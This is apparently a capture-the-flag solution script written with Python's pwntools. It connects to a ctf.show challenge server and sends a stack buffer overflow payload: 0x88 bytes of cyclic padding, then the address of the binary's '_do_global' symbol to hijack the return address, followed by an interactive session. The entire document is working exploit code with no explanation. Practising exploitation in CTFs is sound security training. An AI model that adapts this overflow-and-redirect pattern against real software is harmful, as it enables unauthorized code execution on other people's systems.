from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#io = process('./pwn') 
elf = ELF('./pwn')
io = remote('pwn.challenge.ctf.show',28143)
flag = elf.sym['_do_global']
#flag = 0x400697
payload = cyclic(0x80+8) + p64(flag) 
io.sendline(payload)
io.interactive()
